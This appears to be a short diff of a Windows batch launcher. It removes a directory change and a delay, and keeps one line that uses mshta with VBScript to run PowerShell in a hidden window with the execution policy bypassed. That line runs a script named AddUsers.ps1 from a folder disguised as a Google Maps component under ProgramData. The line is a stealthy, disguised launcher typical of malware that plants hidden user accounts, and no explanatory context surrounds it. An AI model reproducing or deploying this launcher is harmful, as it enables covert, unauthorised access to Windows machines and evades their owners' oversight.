@@ -1,3 +1,1 @@
-cd C:\ProgramData\Google\Maps\
 mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -ExecutionPolicy Bypass & 'C:\ProgramData\Google\Maps\AddUsers.ps1'"", 0:close")
-choice /n /c y /d y /t 3 > nul
